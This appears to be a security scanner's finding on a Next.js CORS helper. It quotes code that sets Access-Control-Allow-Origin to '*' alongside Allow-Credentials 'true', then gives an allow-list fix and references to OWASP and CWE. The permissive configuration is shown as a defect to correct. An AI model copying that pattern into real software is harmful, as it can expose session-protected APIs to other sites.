MEDIUM  likely  Cross-origin policy accepts any origin  A05:2021
────────────────────────────────────────────────────────────────────────
 app/lib/cors.ts:7:3

   5 │ 
   6 │ export function applyOpenCors(response: NextResponse): NextResponse {
   7 │   response.headers.set('Access-Control-Allow-Origin', '*')
     │   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ accepts requests from any origin
   8 │   response.headers.set('Access-Control-Allow-Credentials', 'true')
   9 │   return response

 ↳  fix (Next.js)  Return an explicit origin from the route or
                   middleware, not '*'.
                   const allowed = new Set(['https://app.example.com'])
                   const origin = request.headers.get('origin') ?? ''
                   if (allowed.has(origin)) {
                     response.headers.set('Access-Control-Allow-Origin', origin)
                     response.headers.set('Vary', 'Origin')
                   }
 ↳  why            Any origin may call this API and read the response.
                   That is a deliberate choice for a public endpoint and
                   a mistake for anything behind a session — nothing in
                   the source says which this is, so it is reported for
                   you to decide.
 ⓘ  ref            OWASP A05:2021 · CWE-942 · RULES.md#cors-permissive

